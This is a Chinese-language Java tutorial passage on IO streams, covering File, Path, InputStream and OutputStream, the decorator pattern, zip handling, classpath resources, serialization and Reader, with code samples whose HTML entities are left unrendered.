创建和删除文件当File对象表示一个文件时，可以通过createNewFile()创建一个新文件，用delete()删除该文件： 12345678File file = new File(\"/path/to/file\");if (file.createNewFile()) &#123; // 文件创建成功: // TODO: if (file.delete()) &#123; // 删除文件成功: &#125;&#125; 有些时候，程序需要读写一些临时文件，File对象提供了createTempFile()来创建一个临时文件，以及deleteOnExit()在JVM退出时自动删除该文件。 12345678public class Main &#123; public static void main(String[] args) throws IOException &#123; File f = File.createTempFile(\"tmp-\", \".txt\"); // 提供临时文件的前缀和后缀 f.deleteOnExit(); // JVM退出时自动删除 System.out.println(f.isFile()); System.out.println(f.getAbsolutePath()); &#125;&#125; 遍历文件和目录当File对象表示一个目录时，可以使用list()和listFiles()列出目录下的文件和子目录名。listFiles()提供了一系列重载方法，可以过滤不想要的文件和目录： 1234567891011121314151617181920212223public class Main &#123; public static void main(String[] args) throws IOException &#123; File f = new File(\"C:\\\\Windows\"); File[] fs1 = f.listFiles(); // 列出所有文件和子目录 printFiles(fs1); File[] fs2 = f.listFiles(new FilenameFilter() &#123; // 仅列出.exe文件 public boolean accept(File dir, String name) &#123; return name.endsWith(\".exe\"); // 返回true表示接受该文件 &#125; &#125;); printFiles(fs2); &#125; static void printFiles(File[] files) &#123; System.out.println(\"==========\"); if (files != null) &#123; for (File f : files) &#123; System.out.println(f); &#125; &#125; System.out.println(\"==========\"); &#125;&#125; 和文件操作类似，File对象如果表示一个目录，可以通过以下方法创建和删除目录： boolean mkdir()：创建当前File对象表示的目录； boolean mkdirs()：创建当前File对象表示的目录，并在必要时将不存在的父目录也创建出来； boolean delete()：删除当前File对象表示的目录，当前目录必须为空才能删除成功。 PathJava标准库还提供了一个Path对象，它位于java.nio.file包。Path对象和File对象类似，但操作更加简单： import java.io.*; import java.nio.file.*; 123456789101112131415public class Main &#123; public static void main(String[] args) throws IOException &#123; Path p1 = Paths.get(\".\", \"project\", \"study\"); // 构造一个Path对象 System.out.println(p1);//// .\\project\\study Path p2 = p1.toAbsolutePath(); // 转换为绝对路径 System.out.println(p2);//// D:\\project\\login\\.\\project\\study Path p3 = p2.normalize(); // 转换为规范路径 System.out.println(p3);//// D:\\project\\login\\project\\study File f = p3.toFile(); // 转换为File对象 System.out.println(f);//// D:\\project\\login\\project\\study for (Path p : Paths.get(\"..\").toAbsolutePath()) &#123; // 可以直接遍历Path System.out.println(\" \" + p); &#125; &#125;&#125; 如果需要对目录进行复杂的拼接、遍历等操作，使用Path对象更方便。 小结Java标准库的java.io.File对象表示一个文件或者目录： 创建File对象本身不涉及IO操作； 可以获取路径／绝对路径／规范路径：getPath()/getAbsolutePath()/getCanonicalPath()； 可以获取目录的文件和子目录：list()/listFiles()； 可以创建或删除文件和目录。 InputStreamInputStream就是Java标准库提供的最基本的输入流。它位于java.io这个包里。java.io包提供了所有同步IO的功能。 要特别注意的一点是，InputStream并不是一个接口，而是一个抽象类，它是所有输入流的超类。这个抽象类定义的一个最重要的方法就是int read()，签名如下： 1public abstract int read() throws IOException; 这个方法会读取输入流的下一个字节，并返回字节表示的int值（0~255）。如果已读到末尾，返回-1表示不能继续读取了。 FileInputStream是InputStream的一个子类。顾名思义，FileInputStream就是从文件流中读取数据。下面的代码演示了如何完整地读取一个FileInputStream的所有字节： 123456789101112public void readFile() throws IOException &#123; // 创建一个FileInputStream对象: InputStream input = new FileInputStream(\"src/readme.txt\"); for (;;) &#123; int n = input.read(); // 反复调用read()方法，直到返回-1 if (n == -1) &#123; break; &#125; System.out.println(n); // 打印byte的值 &#125; input.close(); // 关闭流&#125; 在计算机中，类似文件、网络端口这些资源，都是由操作系统统一管理的。应用程序在运行的过程中，如果打开了一个文件进行读写，完成后要及时地关闭，以便让操作系统把资源释放掉，否则，应用程序占用的资源会越来越多，不但白白占用内存，还会影响其他应用程序的运行。 InputStream和OutputStream都是通过close()方法来关闭流。关闭流就会释放对应的底层资源。 我们还要注意到在读取或写入IO流的过程中，可能会发生错误，例如，文件不存在导致无法读取，没有写权限导致写入失败，等等，这些底层错误由Java虚拟机自动封装成IOException异常并抛出。因此，所有与IO操作相关的代码都必须正确处理IOException。 仔细观察上面的代码，会发现一个潜在的问题：如果读取过程中发生了IO错误，InputStream就没法正确地关闭，资源也就没法及时释放。 因此，我们需要用try ... finally来保证InputStream在无论是否发生IO错误的时候都能够正确地关闭： 123456789101112public void readFile() throws IOException &#123; InputStream input &#x3D; null; try &#123; input &#x3D; new FileInputStream(&quot;src&#x2F;readme.txt&quot;); int n; while ((n &#x3D; input.read()) !&#x3D; -1) &#123; &#x2F;&#x2F; 利用while同时读取并判断 System.out.println(n); &#125; &#125; finally &#123; if (input !&#x3D; null) &#123; input.close(); &#125; &#125;&#125; 用try ... finally来编写上述代码会感觉比较复杂，更好的写法是利用Java 7引入的新的try(resource)的语法，只需要编写try语句，让编译器自动为我们关闭资源。推荐的写法如下： 12345678public void readFile() throws IOException &#123; try (InputStream input &#x3D; new FileInputStream(&quot;src&#x2F;readme.txt&quot;)) &#123; int n; while ((n &#x3D; input.read()) !&#x3D; -1) &#123; System.out.println(n); &#125; &#125; &#x2F;&#x2F; 编译器在此自动为我们写入finally并调用close()&#125; 实际上，编译器并不会特别地为InputStream加上自动关闭。编译器只看try(resource = ...)中的对象是否实现了java.lang.AutoCloseable接口，如果实现了，就自动加上finally语句并调用close()方法。InputStream和OutputStream都实现了这个接口，因此，都可以用在try(resource)中。 缓冲在读取流的时候，一次读取一个字节并不是最高效的方法。很多流支持一次性读取多个字节到缓冲区，对于文件和网络流来说，利用缓冲区一次性读取多个字节效率往往要高很多。InputStream提供了两个重载方法来支持读取多个字节： int read(byte[] b)：读取若干字节并填充到byte[]数组，返回读取的字节数 int read(byte[] b, int off, int len)：指定byte[]数组的偏移量和最大填充数 利用上述方法一次读取多个字节时，需要先定义一个byte[]数组作为缓冲区，read()方法会尽可能多地读取字节到缓冲区， 但不会超过缓冲区的大小。read()方法的返回值不再是字节的int值，而是返回实际读取了多少个字节。如果返回-1，表示没有更多的数据了。 利用缓冲区一次读取多个字节的代码如下： 12345678910public void readFile() throws IOException &#123; try (InputStream input &#x3D; new FileInputStream(&quot;src&#x2F;readme.txt&quot;)) &#123; &#x2F;&#x2F; 定义1000个字节大小的缓冲区: byte[] buffer &#x3D; new byte[1000]; int n; while ((n &#x3D; input.read(buffer)) !&#x3D; -1) &#123; &#x2F;&#x2F; 读取到缓冲区 System.out.println(&quot;read &quot; + n + &quot; bytes.&quot;); &#125; &#125;&#125; 阻塞在调用InputStream的read()方法读取数据时，我们说read()方法是阻塞（Blocking）的。它的意思是，对于下面的代码： 123int n;n &#x3D; input.read(); &#x2F;&#x2F; 必须等待read()方法返回才能执行下一行代码int m &#x3D; n; 执行到第二行代码时，必须等read()方法返回后才能继续。因为读取IO流相比执行普通代码，速度会慢很多，因此，无法确定read()方法调用到底要花费多长时间。 InputStream实现类用FileInputStream可以从文件获取输入流，这是InputStream常用的一个实现类。此外，ByteArrayInputStream可以在内存中模拟一个InputStream： 123456789101112import java.io.*; public class Main &#123; public static void main(String[] args) throws IOException &#123; byte[] data = &#123; 72, 101, 108, 108, 111, 33 &#125;; try (InputStream input = new ByteArrayInputStream(data)) &#123; int n; while ((n = input.read()) != -1) &#123; System.out.println((char)n); &#125; &#125; &#125;&#125; ByteArrayInputStream实际上是把一个byte[]数组在内存中变成一个InputStream，虽然实际应用不多，但测试的时候，可以用它来构造一个InputStream。 举个栗子：我们想从文件中读取所有字节，并转换成char然后拼成一个字符串，可以这么写： 1234567891011121314public class Main &#123; public static void main(String[] args) throws IOException &#123; String s; try (InputStream input = new FileInputStream(\"C:\\\\test\\\\README.txt\")) &#123; int n; StringBuilder sb = new StringBuilder(); while ((n = input.read()) != -1) &#123; sb.append((char) n); &#125; s = sb.toString(); &#125; System.out.println(s); &#125;&#125; 要测试上面的程序，就真的需要在本地硬盘上放一个真实的文本文件。如果我们把代码稍微改造一下，提取一个readAsString()的方法： 123456789101112131415161718public class Main &#123; public static void main(String[] args) throws IOException &#123; String s; try (InputStream input = new FileInputStream(\"C:\\\\test\\\\README.txt\")) &#123; s = readAsString(input); &#125; System.out.println(s); &#125; public static String readAsString(InputStream input) throws IOException &#123; int n; StringBuilder sb = new StringBuilder(); while ((n = input.read()) != -1) &#123; sb.append((char) n); &#125; return sb.toString(); &#125;&#125; 对这个String readAsString(InputStream input)方法进行测试就相当简单，因为不一定要传入一个真的FileInputStream： 12345678910111213141516171819import java.io.*;public class Main &#123; public static void main(String[] args) throws IOException &#123; byte[] data = &#123; 72, 101, 108, 108, 111, 33 &#125;; try (InputStream input = new ByteArrayInputStream(data)) &#123; String s = readAsString(input); System.out.println(s); &#125; &#125; public static String readAsString(InputStream input) throws IOException &#123; int n; StringBuilder sb = new StringBuilder(); while ((n = input.read()) != -1) &#123; sb.append((char) n); &#125; return sb.toString(); &#125;&#125; 这就是面向抽象编程原则的应用：接受InputStream抽象类型，而不是具体的FileInputStream类型，从而使得代码可以处理InputStream的任意实现类。 小结Java标准库的java.io.InputStream定义了所有输入流的超类： FileInputStream实现了文件流输入； ByteArrayInputStream在内存中模拟一个字节流输入。 总是使用try(resource)来保证InputStream正确关闭。 OutputStream和InputStream相反，OutputStream是Java标准库提供的最基本的输出流。 和InputStream类似，OutputStream也是抽象类，它是所有输出流的超类。这个抽象类定义的一个最重要的方法就是void write(int b)，签名如下： 1public abstract void write(int b) throws IOException; 这个方法会写入一个字节到输出流。要注意的是，虽然传入的是int参数，但只会写入一个字节，即只写入int最低8位表示字节的部分（相当于b &amp; 0xff）。 和InputStream类似，OutputStream也提供了close()方法关闭输出流，以便释放系统资源。要特别注意：OutputStream还提供了一个flush()方法，它的目的是将缓冲区的内容真正输出到目的地。 为什么要有flush()？因为向磁盘、网络写入数据的时候，出于效率的考虑，操作系统并不是输出一个字节就立刻写入到文件或者发送到网络，而是把输出的字节先放到内存的一个缓冲区里（本质上就是一个byte[]数组），等到缓冲区写满了，再一次性写入文件或者网络。对于很多IO设备来说，一次写一个字节和一次写1000个字节，花费的时间几乎是完全一样的，所以OutputStream有个flush()方法，能强制把缓冲区内容输出。 通常情况下，我们不需要调用这个flush()方法，因为缓冲区写满了OutputStream会自动调用它，并且，在调用close()方法关闭OutputStream之前，也会自动调用flush()方法。 但是，在某些情况下，我们必须手动调用flush()方法。举个栗子： 小明正在开发一款在线聊天软件，当用户输入一句话后，就通过OutputStream的write()方法写入网络流。小明测试的时候发现，发送方输入后，接收方根本收不到任何信息，怎么肥四？ 原因就在于写入网络流是先写入内存缓冲区，等缓冲区满了才会一次性发送到网络。如果缓冲区大小是4K，则发送方要敲几千个字符后，操作系统才会把缓冲区的内容发送出去，这个时候，接收方会一次性收到大量消息。 解决办法就是每输入一句话后，立刻调用flush()，不管当前缓冲区是否已满，强迫操作系统把缓冲区的内容立刻发送出去。 实际上，InputStream也有缓冲区。例如，从FileInputStream读取一个字节时，操作系统往往会一次性读取若干字节到缓冲区，并维护一个指针指向未读的缓冲区。然后，每次我们调用int read()读取下一个字节时，可以直接返回缓冲区的下一个字节，避免每次读一个字节都导致IO操作。当缓冲区全部读完后继续调用read()，则会触发操作系统的下一次读取并再次填满缓冲区。 FileOutputStream我们以FileOutputStream为例，演示如何将若干个字节写入文件流： 123456789public void writeFile() throws IOException &#123; OutputStream output &#x3D; new FileOutputStream(&quot;out&#x2F;readme.txt&quot;); output.write(72); &#x2F;&#x2F; H output.write(101); &#x2F;&#x2F; e output.write(108); &#x2F;&#x2F; l output.write(108); &#x2F;&#x2F; l output.write(111); &#x2F;&#x2F; o output.close();&#125; 每次写入一个字节非常麻烦，更常见的方法是一次性写入若干字节。这时，可以用OutputStream提供的重载方法void write(byte[])来实现： 12345public void writeFile() throws IOException &#123; OutputStream output &#x3D; new FileOutputStream(&quot;out&#x2F;readme.txt&quot;); output.write(&quot;Hello&quot;.getBytes(&quot;UTF-8&quot;)); &#x2F;&#x2F; Hello output.close();&#125; 和InputStream一样，上述代码没有考虑到在发生异常的情况下如何正确地关闭资源。写入过程也会经常发生IO错误，例如，磁盘已满，无权限写入等等。我们需要用try(resource)来保证OutputStream在无论是否发生IO错误的时候都能够正确地关闭： 12345public void writeFile() throws IOException &#123; try (OutputStream output &#x3D; new FileOutputStream(&quot;out&#x2F;readme.txt&quot;)) &#123; output.write(&quot;Hello&quot;.getBytes(&quot;UTF-8&quot;)); &#x2F;&#x2F; Hello &#125; &#x2F;&#x2F; 编译器在此自动为我们写入finally并调用close()&#125; 阻塞和InputStream一样，OutputStream的write()方法也是阻塞的。 OutputStream实现类用FileOutputStream可以从文件获取输出流，这是OutputStream常用的一个实现类。此外，ByteArrayOutputStream可以在内存中模拟一个OutputStream： 123456789101112import java.io.*;public class Main &#123; public static void main(String[] args) throws IOException &#123; byte[] data; try (ByteArrayOutputStream output = new ByteArrayOutputStream()) &#123; output.write(\"Hello \".getBytes(\"UTF-8\")); output.write(\"world!\".getBytes(\"UTF-8\")); data = output.toByteArray(); &#125; System.out.println(new String(data, \"UTF-8\")); &#125;&#125; ByteArrayOutputStream实际上是把一个byte[]数组在内存中变成一个OutputStream，虽然实际应用不多，但测试的时候，可以用它来构造一个OutputStream。 同时操作多个AutoCloseable资源时，在try(resource) { ... }语句中可以同时写出多个资源，用;隔开。例如，同时读写两个文件： 123456&#x2F;&#x2F; 读取input.txt，写入output.txt:try (InputStream input &#x3D; new FileInputStream(&quot;input.txt&quot;); OutputStream output &#x3D; new FileOutputStream(&quot;output.txt&quot;))&#123; input.transferTo(output); &#x2F;&#x2F; transferTo的作用是?&#125; 小结Java标准库的java.io.OutputStream定义了所有输出流的超类： FileOutputStream实现了文件流输出； ByteArrayOutputStream在内存中模拟一个字节流输出。 某些情况下需要手动调用OutputStream的flush()方法来强制输出缓冲区。 总是使用try(resource)来保证OutputStream正确关闭。 Filter模式Java的IO标准库提供的InputStream根据来源可以包括： FileInputStream：从文件读取数据，是最终数据源； ServletInputStream：从HTTP请求读取数据，是最终数据源； Socket.getInputStream()：从TCP连接读取数据，是最终数据源； … 如果我们要给FileInputStream添加缓冲功能，则可以从FileInputStream派生一个类： 1BufferedFileInputStream extends FileInputStream 如果要给FileInputStream添加计算签名的功能，类似的，也可以从FileInputStream派生一个类： 1DigestFileInputStream extends FileInputStream 如果要给FileInputStream添加加密/解密功能，还是可以从FileInputStream派生一个类： 1CipherFileInputStream extends FileInputStream 如果要给FileInputStream添加缓冲和签名的功能，那么我们还需要派生BufferedDigestFileInputStream。如果要给FileInputStream添加缓冲和加解密的功能，则需要派生BufferedCipherFileInputStream。 我们发现，给FileInputStream添加3种功能，至少需要3个子类。这3种功能的组合，又需要更多的子类： 12345678910111213 ┌─────────────────┐ │ FileInputStream │ └─────────────────┘ ▲ ┌───────────┬─────────┼─────────┬───────────┐ │ │ │ │ │┌───────────────────────┐│┌─────────────────┐│┌─────────────────────┐│BufferedFileInputStream│││DigestInputStream│││CipherFileInputStream│└───────────────────────┘│└─────────────────┘│└─────────────────────┘ │ │ ┌─────────────────────────────┐ ┌─────────────────────────────┐ │BufferedDigestFileInputStream│ │BufferedCipherFileInputStream│ └─────────────────────────────┘ └─────────────────────────────┘ 这还只是针对FileInputStream设计，如果针对另一种InputStream设计，很快会出现子类爆炸的情况。 因此，直接使用继承，为各种InputStream附加更多的功能，根本无法控制代码的复杂度，很快就会失控。 为了解决依赖继承会导致子类数量失控的问题，JDK首先将InputStream分为两大类： 一类是直接提供数据的基础InputStream，例如： FileInputStream ByteArrayInputStream ServletInputStream … 一类是提供额外附加功能的InputStream，例如： BufferedInputStream DigestInputStream CipherInputStream … 当我们需要给一个“基础”InputStream附加各种功能时，我们先确定这个能提供数据源的InputStream，因为我们需要的数据总得来自某个地方，例如，FileInputStream，数据来源自文件： 1InputStream file &#x3D; new FileInputStream(&quot;test.gz&quot;); 紧接着，我们希望FileInputStream能提供缓冲的功能来提高读取的效率，因此我们用BufferedInputStream包装这个InputStream，得到的包装类型是BufferedInputStream，但它仍然被视为一个InputStream： 1InputStream buffered &#x3D; new BufferedInputStream(file); 最后，假设该文件已经用gzip压缩了，我们希望直接读取解压缩的内容，就可以再包装一个GZIPInputStream： 1InputStream gzip &#x3D; new GZIPInputStream(buffered); 无论我们包装多少次，得到的对象始终是InputStream，我们直接用InputStream来引用它，就可以正常读取： 123456789┌─────────────────────────┐│GZIPInputStream ││┌───────────────────────┐│││BufferedFileInputStream││││┌─────────────────────┐│││││ FileInputStream │││││└─────────────────────┘│││└───────────────────────┘│└─────────────────────────┘ 上述这种通过一个“基础”组件再叠加各种“附加”功能组件的模式，称之为Filter模式（或者装饰器模式：Decorator）。它可以让我们通过少量的类来实现各种功能的组合： 12345678910111213141516 ┌─────────────┐ │ InputStream │ └─────────────┘ ▲ ▲┌────────────────────┐ │ │ ┌─────────────────┐│ FileInputStream │─┤ └─│FilterInputStream│└────────────────────┘ │ └─────────────────┘┌────────────────────┐ │ ▲ ┌───────────────────┐│ByteArrayInputStream│─┤ ├─│BufferedInputStream│└────────────────────┘ │ │ └───────────────────┘┌────────────────────┐ │ │ ┌───────────────────┐│ ServletInputStream │─┘ ├─│ DataInputStream │└────────────────────┘ │ └───────────────────┘ │ ┌───────────────────┐ └─│CheckedInputStream │ └───────────────────┘ 类似的，OutputStream也是以这种模式来提供各种功能： 12345678910111213141516 ┌─────────────┐ │OutputStream │ └─────────────┘ ▲ ▲┌─────────────────────┐ │ │ ┌──────────────────┐│ FileOutputStream │─┤ └─│FilterOutputStream│└─────────────────────┘ │ └──────────────────┘┌─────────────────────┐ │ ▲ ┌────────────────────┐│ByteArrayOutputStream│─┤ ├─│BufferedOutputStream│└─────────────────────┘ │ │ └────────────────────┘┌─────────────────────┐ │ │ ┌────────────────────┐│ ServletOutputStream │─┘ ├─│ DataOutputStream │└─────────────────────┘ │ └────────────────────┘ │ ┌────────────────────┐ └─│CheckedOutputStream │ └────────────────────┘ 编写FilterInputStream我们也可以自己编写FilterInputStream，以便可以把自己的FilterInputStream“叠加”到任何一个InputStream中。 下面的例子演示了如何编写一个CountInputStream，它的作用是对输入的字节进行计数： 1234567891011121314151617181920212223242526272829303132333435363738394041import java.io.*;public class Main &#123; public static void main(String[] args) throws IOException &#123; byte[] data = \"hello, world!\".getBytes(\"UTF-8\"); try (CountInputStream input = new CountInputStream(new ByteArrayInputStream(data))) &#123; int n; while ((n = input.read()) != -1) &#123; System.out.println((char)n); &#125; System.out.println(\"Total read \" + input.getBytesRead() + \" bytes\"); &#125; &#125;&#125;class CountInputStream extends FilterInputStream &#123; private int count = 0; CountInputStream(InputStream in) &#123; super(in); &#125; public int getBytesRead() &#123; return this.count; &#125; public int read() throws IOException &#123; int n = in.read(); if (n != -1) &#123; this.count ++; &#125; return n; &#125; public int read(byte[] b, int off, int len) throws IOException &#123; int n = in.read(b, off, len); if (n != -1) &#123; this.count += n; &#125; return n; &#125;&#125; 注意到在叠加多个FilterInputStream，我们只需要持有最外层的InputStream，并且，当最外层的InputStream关闭时（在try(resource)块的结束处自动关闭），内层的InputStream的close()方法也会被自动调用，并最终调用到最核心的“基础”InputStream，因此不存在资源泄露。 小结Java的IO标准库使用Filter模式为InputStream和OutputStream增加功能： 可以把一个InputStream和任意个FilterInputStream组合； 可以把一个OutputStream和任意个FilterOutputStream组合。 Filter模式可以在运行期动态增加功能（又称Decorator模式）。 操作ZipZipInputStream是一种FilterInputStream，它可以直接读取zip包的内容： 1234567891011121314151617181920212223┌───────────────────┐│ InputStream │└───────────────────┘ ▲ │┌───────────────────┐│ FilterInputStream │└───────────────────┘ ▲ │┌───────────────────┐│InflaterInputStream│└───────────────────┘ ▲ │┌───────────────────┐│ ZipInputStream │└───────────────────┘ ▲ │┌───────────────────┐│ JarInputStream │└───────────────────┘ 另一个JarInputStream是从ZipInputStream派生，它增加的主要功能是直接读取jar文件里面的MANIFEST.MF文件。因为本质上jar包就是zip包，只是额外附加了一些固定的描述文件。 读取zip包我们来看看ZipInputStream的基本用法。 我们要创建一个ZipInputStream，通常是传入一个FileInputStream作为数据源，然后，循环调用getNextEntry()，直到返回null，表示zip流结束。 一个ZipEntry表示一个压缩文件或目录，如果是压缩文件，我们就用read()方法不断读取，直到返回-1： 123456789101112try (ZipInputStream zip &#x3D; new ZipInputStream(new FileInputStream(...))) &#123; ZipEntry entry &#x3D; null; while ((entry &#x3D; zip.getNextEntry()) !&#x3D; null) &#123; String name &#x3D; entry.getName(); if (!entry.isDirectory()) &#123; int n; while ((n &#x3D; zip.read()) !&#x3D; -1) &#123; ... &#125; &#125; &#125;&#125; 写入zip包ZipOutputStream是一种FilterOutputStream，它可以直接写入内容到zip包。我们要先创建一个ZipOutputStream，通常是包装一个FileOutputStream，然后，每写入一个文件前，先调用putNextEntry()，然后用write()写入byte[]数据，写入完毕后调用closeEntry()结束这个文件的打包。 12345678try (ZipOutputStream zip &#x3D; new ZipOutputStream(new FileOutputStream(...))) &#123; File[] files &#x3D; ... for (File file : files) &#123; zip.putNextEntry(new ZipEntry(file.getName())); zip.write(getFileDataAsBytes(file)); zip.closeEntry(); &#125;&#125; 上面的代码没有考虑文件的目录结构。如果要实现目录层次结构，new ZipEntry(name)传入的name要用相对路径。 小结ZipInputStream可以读取zip格式的流，ZipOutputStream可以把多份数据写入zip包； 配合FileInputStream和FileOutputStream就可以读写zip文件。 读取classpath资源很多Java程序启动的时候，都需要读取配置文件。例如，从一个.properties文件中读取配置： 1234String conf &#x3D; &quot;C:\\\\conf\\\\default.properties&quot;;try (InputStream input &#x3D; new FileInputStream(conf)) &#123; &#x2F;&#x2F; TODO:&#125; 这段代码要正常执行，必须在C盘创建conf目录，然后在目录里创建default.properties文件。但是，在Linux系统上，路径和Windows的又不一样。 因此，从磁盘的固定目录读取配置文件，不是一个好的办法。 有没有路径无关的读取文件的方式呢？ 我们知道，Java存放.class的目录或jar包也可以包含任意其他类型的文件，例如： 配置文件，例如.properties； 图片文件，例如.jpg； 文本文件，例如.txt，.csv； …… 从classpath读取文件就可以避免不同环境下文件路径不一致的问题：如果我们把default.properties文件放到classpath中，就不用关心它的实际存放路径。 在classpath中的资源文件，路径总是以／开头，我们先获取当前的Class对象，然后调用getResourceAsStream()就可以直接从classpath读取任意的资源文件： 123try (InputStream input &#x3D; getClass().getResourceAsStream(&quot;&#x2F;default.properties&quot;)) &#123; &#x2F;&#x2F; TODO:&#125; 调用getResourceAsStream()需要特别注意的一点是，如果资源文件不存在，它将返回null。因此，我们需要检查返回的InputStream是否为null，如果为null，表示资源文件在classpath中没有找到： 12345try (InputStream input &#x3D; getClass().getResourceAsStream(&quot;&#x2F;default.properties&quot;)) &#123; if (input !&#x3D; null) &#123; &#x2F;&#x2F; TODO: &#125;&#125; 如果我们把默认的配置放到jar包中，再从外部文件系统读取一个可选的配置文件，就可以做到既有默认的配置文件，又可以让用户自己修改配置： 123Properties props &#x3D; new Properties();props.load(inputStreamFromClassPath(&quot;&#x2F;default.properties&quot;));props.load(inputStreamFromFile(&quot;.&#x2F;conf.properties&quot;)); 这样读取配置文件，应用程序启动就更加灵活。 小结把资源存储在classpath中可以避免文件路径依赖； Class对象的getResourceAsStream()可以从classpath中读取指定资源； 根据classpath读取资源时，需要检查返回的InputStream是否为null。 序列化序列化是指把一个Java对象变成二进制内容，本质上就是一个byte[]数组。 为什么要把Java对象序列化呢？因为序列化后可以把byte[]保存到文件中，或者把byte[]通过网络传输到远程，这样，就相当于把Java对象存储到文件或者通过网络传输出去了。 有序列化，就有反序列化，即把一个二进制内容（也就是byte[]数组）变回Java对象。有了反序列化，保存到文件中的byte[]数组又可以“变回”Java对象，或者从网络上读取byte[]并把它“变回”Java对象。 我们来看看如何把一个Java对象序列化。 一个Java对象要能序列化，必须实现一个特殊的java.io.Serializable接口，它的定义如下： 12public interface Serializable &#123;&#125; Serializable接口没有定义任何方法，它是一个空接口。我们把这样的空接口称为“标记接口”（Marker Interface），实现了标记接口的类仅仅是给自身贴了个“标记”，并没有增加任何方法。 序列化把一个Java对象变为byte[]数组，需要使用ObjectOutputStream。它负责把一个Java对象写入一个字节流： 123456789101112131415import java.io.*; import java.util.Arrays; public class Main &#123; public static void main(String[] args) throws IOException &#123; ByteArrayOutputStream buffer = new ByteArrayOutputStream(); try (ObjectOutputStream output = new ObjectOutputStream(buffer)) &#123; // 写入int: output.writeInt(12345); // 写入String: output.writeUTF(\"Hello\"); // 写入Object: output.writeObject(Double.valueOf(123.456)); &#125; System.out.println(Arrays.toString(buffer.toByteArray())); &#125;&#125; ObjectOutputStream既可以写入基本类型，如int，boolean，也可以写入String（以UTF-8编码），还可以写入实现了Serializable接口的Object。 因为写入Object时需要大量的类型信息，所以写入的内容很大。 反序列化和ObjectOutputStream相反，ObjectInputStream负责从一个字节流读取Java对象： 12345try (ObjectInputStream input &#x3D; new ObjectInputStream(...)) &#123; int n &#x3D; input.readInt(); String s &#x3D; input.readUTF(); Double d &#x3D; (Double) input.readObject();&#125; 除了能读取基本类型和String类型外，调用readObject()可以直接返回一个Object对象。要把它变成一个特定类型，必须强制转型。 readObject()可能抛出的异常有： ClassNotFoundException：没有找到对应的Class； InvalidClassException：Class不匹配。 对于ClassNotFoundException，这种情况常见于一台电脑上的Java程序把一个Java对象，例如，Person对象序列化以后，通过网络传给另一台电脑上的另一个Java程序，但是这台电脑的Java程序并没有定义Person类，所以无法反序列化。 对于InvalidClassException，这种情况常见于序列化的Person对象定义了一个int类型的age字段，但是反序列化时，Person类定义的age字段被改成了long类型，所以导致class不兼容。 为了避免这种class定义变动导致的不兼容，Java的序列化允许class定义一个特殊的serialVersionUID静态变量，用于标识Java类的序列化“版本”，通常可以由IDE自动生成。如果增加或修改了字段，可以改变serialVersionUID的值，这样就能自动阻止不匹配的class版本： 123public class Person implements Serializable &#123; private static final long serialVersionUID &#x3D; 2709425275741743919L;&#125; 要特别注意反序列化的几个重要特点： 反序列化时，由JVM直接构造出Java对象，不调用构造方法，构造方法内部的代码，在反序列化时根本不可能执行。 安全性因为Java的序列化机制可以导致一个实例能直接从byte[]数组创建，而不经过构造方法，因此，它存在一定的安全隐患。一个精心构造的byte[]数组被反序列化后可以执行特定的Java代码，从而导致严重的安全漏洞。 实际上，Java本身提供的基于对象的序列化和反序列化机制既存在安全性问题，也存在兼容性问题。更好的序列化方法是通过JSON这样的通用数据结构来实现，只输出基本类型（包括String）的内容，而不存储任何与代码相关的信息。 小结可序列化的Java对象必须实现java.io.Serializable接口，类似Serializable这样的空接口被称为“标记接口”（Marker Interface）； 反序列化时不调用构造方法，可设置serialVersionUID作为版本号（非必需）； Java的序列化机制仅适用于Java，如果需要与其它语言交换数据，必须使用通用的序列化方法，例如JSON。 ReaderReader是Java的IO库提供的另一个输入流接口。和InputStream的区别是，InputStream是一个字节流，即以byte为单位读取，而Reader是一个字符流，即以char为单位读取： InputStream Reader 字节流，以byte为单位 字符流，以char为单位 读取字节（-1，0~255）：int read() 读取字符（-1，0~65535）：int read() 读到字节数组：int read(byte[] b) 读到字符数组：int read(char[] c) java.io.Reader是所有字符输入流的超类，它最主要的方法是： 1public int read() throws IOException; 这个方法读取字符流的下一个字符，并返回字符表示的int，范围是0~65535。如果已读到末尾，返回-1。 FileReaderFileReader是Reader的一个子类，它可以打开文件并获取Reader。下面的代码演示了如何完整地读取一个FileReader的所有字符： 123456789101112public void readFile() throws IOException &#123; &#x2F;&#x2F; 创建一个FileReader对象: Reader reader &#x3D; new FileReader(&quot;src&#x2F;readme.txt&quot;); &#x2F;&#x2F; 字符编码是??? for (;;) &#123; int n &#x3D; reader.read(); &#x2F;&#x2F; 反复调用read()方法，直到返回-1 if (n &#x3D;&#x3D; -1) &#123; break; &#125; System.out.println((char)n); &#x2F;&#x2F; 打印char &#125; reader.close(); &#x2F;&#x2F; 关闭流&#125; 如果我们读取一个纯ASCII编码的文本文件，上述代码工作是没有问题的。但如果文件中包含中文，就会出现乱码，因为FileReader默认的编码与系统相关，例如，Windows系统的默认编码可能是GBK，打开一个UTF-8编码的文本文件就会出现乱码。 要避免乱码问题，我们需要在创建FileReader时指定编码： 1Reader reader &#x3D; new FileReader(&quot;src&#x2F;readme.txt&quot;, StandardCharsets.UTF_8); 和InputStream类似，Reader也是一种资源，需要保证出错的时候也能正确关闭，所以我们需要用try (resource)来保证Reader在无论有没有IO错误的时候都能够正确地关闭： 123try (Reader reader &#x3D; new FileReader(&quot;src&#x2F;readme.txt&quot;, StandardCharsets.UTF_8) &#123; &#x2F;&#x2F; TODO&#125; Reader还提供了一次性读取若干字符并填充到char[]数组的方法： 1public int read(char[] c) throws IOException 它返回实际读入的字符个数，最大不超过char[]数组的长度。返回-1表示流结束。 利用这个方法，我们可以先设置一个缓冲区，然后，每次尽可能地填充缓冲区： 123456789public void readFile() throws IOException &#123; try (Reader reader &#x3D; new FileReader(&quot;src&#x2F;readme.txt&quot;, StandardCharsets.UTF_8)) &#123; char[] buffer &#x3D; new char[1000]; int n; while ((n &#x3D; reader.read(buffer)) !&#x3D; -1) &#123; System.out.println(&quot;read &quot; + n + &quot; chars.&quot;); &#125; &#125;&#125; CharArrayReaderCharArrayReader可以在内存中模拟一个Reader，它的作用实际上是把一个char[]数组变成一个Reader，这和ByteArrayInputStream非常类似： 12try (Reader reader &#x3D; new CharArrayReader(&quot;Hello&quot;.toCharArray())) &#123;&#125; StringReaderStringReader可以直接把String作为数据源，它和CharArrayReader几乎一样： 12try (Reader reader &#x3D; new StringReader(&quot;Hello&quot;)) &#123;&#125; InputStreamReaderReader和InputStream有什么关系？ 